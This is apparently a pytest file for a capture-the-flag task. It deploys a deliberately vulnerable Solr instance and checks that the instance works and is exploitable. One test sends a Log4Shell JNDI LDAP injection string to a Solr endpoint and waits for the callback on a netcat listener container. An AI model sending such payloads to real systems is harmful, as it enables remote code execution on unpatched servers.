import os
import re
import shlex
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor

import pytest
import requests

from toolbox.utils.test_utils import check_status_code

TASK_HOST = "smog4shell.hack4krak.pl"
SOLR_PATH = "/solr/admin/info/system"
SOLR_RETRIES = 18
SOLR_RETRY_DELAY = 5
PARALLEL_CREATE_REQUESTS = 4


def _url(path: str) -> str:
    base_url = os.getenv("TASKS_DEPLOYMENT_URL", "http://localhost:8000")
    return f"{base_url.rstrip('/')}/{path.lstrip('/')}"


@pytest.fixture()
def client() -> requests.Session:
    session = requests.Session()

    response = None
    for _ in range(12):
        response = session.post(_url("/api/login"), headers={"Host": TASK_HOST}, timeout=20)
        if response.status_code == 200:
            break
        print(f"POST /api/login -> {response.status_code} {response.text[:120]!r}", flush=True)
        time.sleep(5)

    assert response is not None
    check_status_code(response)
    assert response.json() == {"ok": True}
    assert "session" in session.cookies

    return session


def _create_instance(session: requests.Session) -> str:
    print("POST /api/create", flush=True)
    response = session.post(_url("/api/create"), headers={"Host": TASK_HOST}, timeout=30)
    print(f"POST /api/create -> {response.status_code} {response.text[:200]}", flush=True)
    check_status_code(response)

    url = response.json().get("url")
    assert re.fullmatch(r"[a-f0-9]{8}-solr\.hack4krak\.pl", url), response.text
    return url


def _container_name(host: str) -> str:
    return f"{host.split('-solr.', 1)[0]}-solr-log4shell-server"


def _request_from_container(host: str, path: str = SOLR_PATH) -> str | None:
    command = "\r\n".join([
        f"GET {path} HTTP/1.1",
        "Host: localhost",
        "Connection: close",
        "",
        "",
    ])
    probe = f"exec 3<>/dev/tcp/127.0.0.1/8983; printf '%s' {shlex.quote(command)} >&3; timeout 10 cat <&3"
    result = subprocess.run(
        ["docker", "exec", _container_name(host), "bash", "-lc", probe],
        check=False,
        capture_output=True,
        text=True,
        timeout=15,
    )
    if result.returncode == 0:
        return result.stdout
    print(f"docker exec probe failed: {result.stderr[:300]}", flush=True)
    return None


def _wait_for_solr(host: str) -> str:
    last_response = None
    last_container_response = None

    for _ in range(SOLR_RETRIES):
        try:
            print(f"GET {host}{SOLR_PATH}", flush=True)
            response = requests.get(_url(SOLR_PATH), headers={"Host": host}, timeout=10)
            print(f"GET {host}{SOLR_PATH} -> {response.status_code} {response.text[:120]!r}", flush=True)
            if response.status_code == 200 and "lucene" in response.text.lower():
                return response.text
            last_response = response
        except requests.RequestException:
            pass

        last_container_response = _request_from_container(host)
        if last_container_response and "lucene" in last_container_response.lower():
            return last_container_response

        time.sleep(SOLR_RETRY_DELAY)

    if last_response is not None:
        pytest.fail(
            f"Solr did not become ready, last status={last_response.status_code}, body={last_response.text[:300]}"
        )
    if last_container_response is not None:
        pytest.fail(f"Solr did not become ready, last container body={last_container_response[:300]}")
    raise AssertionError("Solr did not become ready")


def _container_ip(container_name: str) -> str:
    result = subprocess.run(
        [
            "docker",
            "inspect",
            container_name,
            "--format",
            "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}",
        ],
        check=True,
        capture_output=True,
        text=True,
        timeout=10,
    )
    return result.stdout.strip()


def _wait_for_log4shell_callback(host: str) -> None:
    callback_name = f"smog4shell-callback-{host.split('-solr.', 1)[0]}"
    subprocess.run(["docker", "rm", "-f", callback_name], check=False, capture_output=True, timeout=10)

    try:
        subprocess.run(
            [
                "docker",
                "run",
                "-d",
                "--name",
                callback_name,
                "--network",
                "bridge",
                "solr-log4shell-server",
                "bash",
                "-lc",
                "timeout 20 nc -l -p 1389 >/tmp/log4shell-callback; test -s /tmp/log4shell-callback",
            ],
            check=True,
            capture_output=True,
            text=True,
            timeout=20,
        )

        callback_ip = _container_ip(callback_name)
        payload = f"${{jndi:ldap://{callback_ip}:1389/Exploit}}"
        _request_from_container(host, f"/solr/admin/cores?cokolwiek={payload}")

        result = subprocess.run(
            ["docker", "wait", callback_name],
            check=False,
            capture_output=True,
            text=True,
            timeout=25,
        )
        assert result.returncode == 0 and result.stdout.strip() == "0", (
            "Solr did not perform the Log4Shell LDAP callback"
        )
    finally:
        subprocess.run(["docker", "rm", "-f", callback_name], check=False, capture_output=True, timeout=10)


@pytest.mark.timeout(180)
def test_full_path_creates_instance_and_exposes_solr(client: requests.Session) -> None:
    instance_host = _create_instance(client)

    body = _wait_for_solr(instance_host)
    assert "lucene" in body.lower()

    _wait_for_log4shell_callback(instance_host)


@pytest.mark.timeout(180)
def test_repeated_and_parallel_creates_reuse_one_instance(client: requests.Session) -> None:
    first_url = _create_instance(client)
    second_url = _create_instance(client)
    assert second_url == first_url

    with ThreadPoolExecutor(max_workers=PARALLEL_CREATE_REQUESTS) as executor:
        urls = list(executor.map(lambda _: _create_instance(client), range(PARALLEL_CREATE_REQUESTS)))

    assert set(urls) == {first_url}
